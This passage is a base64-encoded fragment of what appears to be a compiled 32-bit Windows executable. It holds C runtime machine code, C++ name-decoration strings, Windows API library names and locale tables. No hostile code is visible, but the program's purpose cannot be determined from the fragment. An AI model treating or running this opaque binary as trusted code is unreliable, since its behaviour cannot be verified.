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AAAgbmV3AAAAACBkZWxldGUAPQAAAD4+AAA8PAAAIQAAAD09AAAhPQAAW10AAG9wZXJhdG9yAAAAAC0+AAAqAAAAKysAAC0tAAAtAAAAKwAAACYAAAAtPioALwAAACUAAAA8AAAAPD0AAD4AAAA+PQAALAAAACgpAAB+AAAAXgAAAHwAAAAmJgAAfHwAACo9AAArPQAALT0AAC89AAAlPQAAPj49ADw8PQAmPQAAfD0AAF49AABgdmZ0YWJsZScAAABgdmJ0YWJsZScAAABgdmNhbGwnAGB0eXBlb2YnAAAAAGBsb2NhbCBzdGF0aWMgZ3VhcmQnAAAAAGBzdHJpbmcnAAAAAGB2YmFzZSBkZXN0cnVjdG9yJwAAYHZlY3RvciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgZGVmYXVsdCBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAGB2aXJ0dWFsIGRpc3BsYWNlbWVudCBtYXAnAABgZWggdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAABgY29weSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAYHVkdCByZXR1cm5pbmcnAGBFSABgUlRUSQAAAGBsb2NhbCB2ZnRhYmxlJwBgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAgbmV3W10AACBkZWxldGVbXQAAAGBvbW5pIGNhbGxzaWcnAABgcGxhY2VtZW50IGRlbGV0ZSBjbG9zdXJlJwAAYHBsYWNlbWVudCBkZWxldGVbXSBjbG9zdXJlJwAAAABgbWFuYWdlZCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBlaCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgZWggdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAGBkeW5hbWljIGluaXRpYWxpemVyIGZvciAnAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAGBtYW5hZ2VkIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGxvY2FsIHN0YXRpYyB0aHJlYWQgZ3VhcmQnAG9wZXJhdG9yICIiIAAAAABvcGVyYXRvciBjb19hd2FpdAAAAG9wZXJhdG9yPD0+ACBUeXBlIERlc2NyaXB0b3InAAAAIEJhc2UgQ2xhc3MgRGVzY3JpcHRvciBhdCAoACBCYXNlIENsYXNzIEFycmF5JwAAIENsYXNzIEhpZXJhcmNoeSBEZXNjcmlwdG9yJwAAAAAgQ29tcGxldGUgT2JqZWN0IExvY2F0b3InAAAAYGFub255bW91cyBuYW1lc3BhY2UnAAAArGtBAOhrQQAkbEEAYQBwAGkALQBtAHMALQB3AGkAbgAtAGMAbwByAGUALQBmAGkAYgBlAHIAcwAtAGwAMQAtADEALQAxAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAGMAbwByAGUALQBzAHkAbgBjAGgALQBsADEALQAyAC0AMAAAAAAAawBlAHIAbgBlAGwAMwAyAAAAAABhAHAAaQAtAG0AcwAtAAAAAAAAAAIAAABGbHNBbGxvYwAAAAAAAAAAAgAAAEZsc0ZyZWUAAAAAAAIAAABGbHNHZXRWYWx1ZQAAAAAAAgAAAEZsc1NldFZhbHVlAAEAAAACAAAASW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkV4ADjCQQBWRkAAmEpAAFVua25vd24gZXhjZXB0aW9uAAAAgMJBAFZGQACYSkAAYmFkIGV4Y2VwdGlvbgAAAG0AcwBjAG8AcgBlAGUALgBkAGwAbAAAAENvckV4aXRQcm9jZXNzAAAAAAAABgAABgABAAAQAAMGAAYCEARFRUUFBQUFBTUwAFAAAAAAKCA4UFgHCAA3MDBXUAcAACAgCAcAAAAIYGhgYGBgAAB4cHh4eHgIBwgHAAcACAgIAAAIBwgABwgABwAoAG4AdQBsAGwAKQAAAAAAKG51bGwpAAAAAAAABQAAwAsAAAAAAAAAHQAAwAQAAAAAAAAAlgAAwAQAAAAAAAAAjQAAwAgAAAAAAAAAjgAAwAgAAAAAAAAAjwAAwAgAAAAAAAAAkAAAwAgAAAAAAAAAkQAAwAgAAAAAAAAAkgAAwAgAAAAAAAAAkwAAwAgAAAAAAAAAtAIAwAgAAAAAAAAAtQIAwAgAAAAAAAAADAAAAAMAAAAJAAAAAAAAAOuLQAAAAAAAGoxAAAAAAACCoEAAraBAAEYjQABGI0AAUphAAKqYQAAD3kAAFN5AAAAAAABIjEAABbJAADGyQADLpUAAK6ZAADCHQABGI0AA9ctAAAAAAAAAAAAARiNAAAAAAABojEAAAAAAAFGMQABGI0AAEoxAAPiLQABGI0AAAQAAABYAAAACAAAAAgAAAAMAAAACAAAABAAAABgAAAAFAAAADQAAAAYAAAAJAAAABwAAAAwAAAAIAAAADAAAAAkAAAAMAAAACgAAAAcAAAALAAAACAAAAAwAAAAWAAAADQAAABYAAAAPAAAAAgAAABAAAAANAAAAEQAAABIAAAASAAAAAgAAACEAAAANAAAANQAAAAIAAABBAAAADQAAAEMAAAACAAAAUAAAABEAAABSAAAADQAAAFMAAAANAAAAVwAAABYAAABZAAAACwAAAGwAAAANAAAAbQAAACAAAABwAAAAHAAAAHIAAAAJAAAAgAAAAAoAAACBAAAACgAAAIIAAAAJAAAAgwAAABYAAACEAAAADQAAAJEAAAApAAAAngAAAA0AAAChAAAAAgAAAKQAAAALAAAApwAAAA0AAAC3AAAAEQAAAM4AAAACAAAA1wAAAAsAAABZBAAAKgAAABgHAAAMAAAAcHBBAKxrQQCwcEEA6HBBADBxQQCQcUEA3HFBAOhrQQAYckEAWHJBAJRyQQDQckEAIHNBAHhzQQDAc0EAEHRBACRsQQAkdEEAMHRBAHh0QQBhAHAAaQAtAG0AcwAtAHcAaQBuAC0AYwBvAHIAZQAtAGQAYQB0AGUAdABpAG0AZQAtAGwAMQAtADEALQAxAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAGMAbwByAGUALQBmAGkAbABlAC0AbAAxAC0AMgAtADIAAABhAHAAaQAtAG0AcwAtAHcAaQBuAC0AYwBvAHIAZQAtAGwAbwBjAGEAbABpAHoAYQB0AGkAbwBuAC0AbAAxAC0AMgAtADEAAABhAHAAaQAtAG0AcwAtAHcAaQBuAC0AYwBvAHIAZQAtAGwAbwBjAGEAbABpAHoAYQB0AGkAbwBuAC0AbwBiAHMAbwBsAGUAdABlAC0AbAAxAC0AMgAtADAAAAAAAAAAAABhAHAAaQAtAG0AcwAtAHcAaQBuAC0AYwBvAHIAZQAtAHAAcgBvAGMAZQBzAHMAdABoAHIAZQBhAGQAcwAtAGwAMQAtADEALQAyAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAGMAbwByAGUALQBzAHQAcgBpAG4AZwAtAGwAMQAtADEALQAwAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAGMAbwByAGUALQBzAHkAcwBpAG4AZgBvAC0AbAAxAC0AMgAtADEAAAAAAGEAcABpAC0AbQBzAC0AdwBpAG4ALQBjAG8AcgBlAC0AdwBpAG4AcgB0AC0AbAAxAC0AMQAtADAAAAAAAGEAcABpAC0AbQBzAC0AdwBpAG4ALQBjAG8AcgBlAC0AeABzAHQAYQB0AGUALQBsADIALQAxAC0AMAAAAGEAcABpAC0AbQBzAC0AdwBpAG4ALQByAHQAYwBvAHIAZQAtAG4AdAB1AHMAZQByAC0AdwBpAG4AZABvAHcALQBsADEALQAxAC0AMAAAAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAHMAZQBjAHUAcgBpAHQAeQAtAHMAeQBzAHQAZQBtAGYAdQBuAGMAdABpAG8AbgBzAC0AbAAxAC0AMQAtADAAAAAAAGUAeAB0AC0AbQBzAC0AdwBpAG4ALQBuAHQAdQBzAGUAcgAtAGQAaQBhAGwAbwBnAGIAbwB4AC0AbAAxAC0AMQAtADAAAAAAAGUAeAB0AC0AbQBzAC0AdwBpAG4ALQBuAHQAdQBzAGUAcgAtAHcAaQBuAGQAbwB3AHMAdABhAHQAaQBvAG4ALQBsADEALQAxAC0AMAAAAAAAYQBkAHYAYQBwAGkAMwAyAAAAAABuAHQAZABsAGwAAABhAHAAaQAtAG0A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